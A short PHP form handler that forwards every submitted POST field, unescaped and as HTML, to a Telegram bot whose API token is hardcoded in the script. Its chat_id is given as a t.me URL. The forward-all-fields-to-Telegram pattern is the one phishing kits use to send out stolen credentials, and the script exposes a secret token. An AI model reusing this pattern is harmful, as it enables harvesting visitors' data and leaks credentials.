<?php
$content = '';
foreach ($_POST as $key => $value) {
    if ($value){
    $content .= "<br>$key<br>: <i>$value</i>\n";
 }
}
if (trim($content)){
    $content ="<br> Message from site:<br>\n".$content;
    $apiToken ="6923345183:AAEU89pIqouYRTmUPOfu_Rh55l6t40Oo560";
    $data =[
        'chat_id' =>'https://t.me/dhydgdhudsjcudihbot',
        'text' => $content,
        'parse_mode' => 'HTML'
    ];
    $response= file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));
}
?>